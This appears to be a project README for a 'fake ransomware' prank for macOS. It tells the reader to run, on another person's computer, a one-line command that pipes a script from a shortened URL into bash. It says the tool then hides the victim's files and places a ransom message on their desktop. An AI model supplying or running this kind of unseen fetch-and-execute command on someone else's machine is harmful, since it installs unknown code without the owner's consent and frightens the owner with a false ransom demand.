# ⁉️ April Fools Ransomware
A FAKE ransomware for macOS, useful for pranks.
# ⬇️ Installation
Run this on the computer you want to prank
```/bin/bash -c "$(curl -fsSL http://bitly.ws/qhXI)"```
# 🤔 How does it work?
1. Uses the `chflags hidden` command to **make files appear hidden**
2. Adds a shell script to your bin to show the files again
3. Uses the `curl -fsSL` command to save the ransom message to their desktop
